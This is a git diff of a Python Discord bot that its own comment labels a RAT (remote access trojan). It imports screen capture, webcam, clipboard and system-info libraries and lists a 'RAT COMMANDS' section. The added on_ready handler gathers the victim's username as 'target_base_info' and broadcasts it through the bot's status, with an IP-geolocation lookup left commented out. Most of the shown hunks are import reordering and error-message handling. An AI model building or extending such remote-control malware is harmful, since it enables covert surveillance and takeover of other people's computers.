@@ -1,41 +1,30 @@
-import os
-
-import discord
-import subprocess
-from discord.ext import commands
-from datetime import datetime
-import requests
-import getpass
-import pyautogui
-import string
-import random
-import webbrowser
-import platform
-import psutil
-import uuid
-import socket
-import re
-import textwrap
-import pwd
-import clipboard
 import functools
-import PIL
+import getpass
+import os
+import platform
+import pwd
+import random
+import re
+import socket
+import string
+import subprocess
+import textwrap
+import uuid
+import webbrowser
+from datetime import datetime
+
+import clipboard
 import cv2
+import discord
+import PIL
+import psutil
+import pyautogui
+import requests
+from discord.ext import commands
 
 from src.database.manager import main as db_main
 
 client = commands.Bot(command_prefix=db_main.prefix)
-
-
-# Load all cogs at startup of the bot
-for filename in os.listdir('./src/cogs'):
-    if filename.endswith('.py'):
-        try:
-            client.load_extension(f'src.cogs.{filename[:-3]}')
-            print(f"[+] Loaded: src.cogs.{filename[:-3]}")
-        except Exception as excl:
-            print(
-                f"[+] Unable to load: src.cogs.{filename[:-3]}  :  {excl}")
 
 
 @client.command()
@@ -50,6 +39,35 @@ async def unloadex(ctx, extension):
     client.unload_extension(
         f'src.cogs.{extension if not(str(extension).endswith(".py")) else extension[:-3]}')
     await ctx.send(f"Un-Loaded cog: {extension}")
+
+
+@client.event
+async def on_ready():
+    print(f'[*] Python Version: {platform.python_version()}')
+    print(f'[*] Discord.py API Version: {discord.__version__}')
+    print(f'[*] Logged in as {client.user} | {client.user.id}')
+
+    target_base_info = ""
+    try:
+        target_base_info += getpass.getuser()
+        target_base_info += " | "
+    except:
+        pass
+
+    # try:
+    #     ipinfo = requests.get("http://ip-api.com/json/").json()
+    #     target_base_info += ipinfo["query"]
+    # except:
+    #     pass
+
+    await client.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.watching,
+            name=f'{target_base_info}'
+        )
+    )
+    print(f'[+] Changed precence to: {target_base_info}')
+    print(f'[+] Client is online!!')
 
 
 @client.event
@@ -71,6 +89,82 @@ async def on_message(message):
         if message.content.lower().startswith(db_main.prefix):
             await message.reply("This bot is still under development. Stay tuned! Thank you.")
             return
+
+
+@client.event
+async def on_command_error(ctx, error):
+    embed = discord.Embed(
+        title="An error has occured",
+        color=0xff0000,
+        timestamp=datetime.utcnow()
+    )
+    embed.set_author(
+        name=str(client.user.name),
+        icon_url=str(client.user.avatar_url)
+    )
+
+    embed.set_thumbnail(
+        url="https://cdn.discordapp.com/attachments/877796755234783273/961984775176982558/unknown.png?size=4096")
+
+    if isinstance(error, commands.MissingAnyRole):
+        embed.add_field(
+            name="Error:",
+            value="User Missing Any Role.",
+            inline=False
+        )
+
+    if isinstance(error, commands.MissingPermissions):
+        embed.add_field(
+            name="Error:",
+            value="User Missing Permissions to use this command.",
+            inline=False
+        )
+
+    if isinstance(error, commands.MissingRequiredArgument):
+        embed.add_field(
+            name="Error:",
+            value="Missing Required Argument. Not all arguments for the usage of this command was passed. Please refer help.",
+            inline=False
+        )
+
+    if isinstance(error, commands.MissingRole):
+        embed.add_field(
+            name="Error:",
+            value="User Missing Role. You dont have a required role to use this command.",
+            inline=False
+        )
+
+    if isinstance(error, commands.BotMissingAnyRole):
+        embed.add_field(
+            name="Error:",
+            value=f"Bot Missing Role. {client.user.name} does not have any role for this.",
+            inline=False
+        )
+
+    if isinstance(error, commands.BotMissingPermissions):
+        embed.add_field(
+            name="Error:",
+            value=f"Bot Missing Permissions. {client.user.name} does not have enough permission for this command to be run successfully.",
+            inline=False
+        )
+
+    if isinstance(error, commands.BotMissingRole):
+        embed.add_field(
+            name="Error:",
+            value=f"Bot Missing Role. {client.user.name} does not have a required role to complete this action.",
+            inline=False
+        )
+
+    if isinstance(error, commands.ArgumentParsingError):
+        embed.add_field(
+            name="Error:",
+            value=f"Unable to process the arguments given with the command",
+            inline=False
+        )
+
+    embed.set_footer(text=f"Reuqested by {ctx.author.name}")
+    await ctx.send(embed=embed)
+
 
 # ALL RAT COMMANDS
 # --------------------------------------------------------------
@@ -126,9 +220,10 @@ async def volume(ctx, value, mode="+"):
         """
     try:
         if os.name == 'nt':
-            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-            from comtypes import CLSCTX_ALL
             from ctypes import POINTER, cast
+
+            from comtypes import CLSCTX_ALL
+            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
             # Increase the volume
             if value in ("+", "p", "i", "inc", "increase", "add", "a", "plus") or mode in ("+", "p", "i", "inc", "increase", "add", "a", "plus"):
